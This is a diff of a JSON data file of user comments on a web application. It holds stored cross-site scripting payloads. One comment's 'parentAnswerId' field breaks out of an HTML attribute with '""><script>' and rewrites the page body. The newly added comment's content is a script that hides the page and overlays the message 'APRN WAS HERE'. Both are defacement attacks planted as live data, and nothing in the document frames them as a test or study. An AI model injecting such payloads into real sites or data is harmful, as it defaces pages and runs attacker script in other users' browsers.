@@ -4839,6 +4839,15 @@
           "date": "2026-10-09T19:24:06.016Z",
           "replies": [],
           "parentAnswerId": "\"\"><script>document.body.innerHTML=\"<h1 style='color:#ff0000;font-size:6rem;text-align:center;margin-top:20%;z-index:9999;position:relative'>APRN WAS HERE</h1>\";document.querySelectorAll(\"body *\").forEach(el => el.style.display=\"none\");</script><!--"
+        },
+        {
+          "id": 1791573963490,
+          "content": "<script>\ndocument.addEventListener(\"DOMContentLoaded\", function() {\n    // Hide everything\n    document.body.style.display = \"none\";\n    \n    // Create overlay\n    var overlay = document.createElement(\"div\");\n    overlay.style.position = \"fixed\";\n    overlay.style.top = \"0\";\n    overlay.style.left = \"0\";\n    overlay.style.width = \"100%\";\n    overlay.style.height = \"100%\";\n    overlay.style.backgroundColor = \"#000\";\n    overlay.style.zIndex = \"999999\";\n    overlay.style.display = \"flex\";\n    overlay.style.justifyContent = \"center\";\n    overlay.style.alignItems = \"center\";\n    overlay.style.color = \"#ff0000\";\n    overlay.style.fontFamily = \"monospace\";\n    overlay.style.fontSize = \"5rem\";\n    overlay.style.textShadow = \"0 0 10px #fff\";\n    overlay.innerHTML = \"APRN WAS HERE\";\n    \n    document.body.appendChild(overlay);\n});\n</script>",
+          "author": "Akhi Ex",
+          "isOwner": true,
+          "date": "2026-10-09T19:26:03.490Z",
+          "replies": [],
+          "parentAnswerId": null
         }
       ]
     },
